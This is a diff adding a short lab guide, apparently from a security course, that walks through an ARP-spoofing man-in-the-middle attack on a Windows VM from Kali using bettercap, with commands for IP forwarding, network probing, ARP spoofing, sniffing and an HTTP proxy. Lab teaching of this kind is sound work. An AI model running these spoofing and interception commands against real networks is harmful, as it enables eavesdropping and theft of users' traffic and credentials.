@@ -1,0 +1,56 @@
+ARPple		Project 6	poisoned ARPple
+-------------------------------
+
+### Step 3: Verify the Environment
+
+On Kali, run `ip route`. You must see a line starting with `default via ...`.
+On Windows, run `ping google.com`. It should succeed.
+If both VMs can reach the internet and can ping each other, you are ready.
+
+
+
+sudo sysctl -w net.ipv4.ip_forward=1
+
+
+sudo bettercap -iface eth0
+	Note: Ensure "gateway monitor started" appears in the logs.
+
+
+
+### Step 6: Discover the Target
+Search the network for the Windows VM.
+
+```
+net.probe on
+net.show
+```
+
+
+
+### Step 7: Start the Spoofing
+Tell bettercap to target the Windows VM and start the ARP attack.
+
+```
+set arp.spoof.targets [Victim IP]
+arp.spoof on
+```
+
+
+
+### Step 8: Start the Sniffer and Proxy
+We need to actually look at the traffic we are now receiving.
+
+```
+net.sniff on
+http.proxy on
+```
+
+
+
+
+
+
+
+
+
+
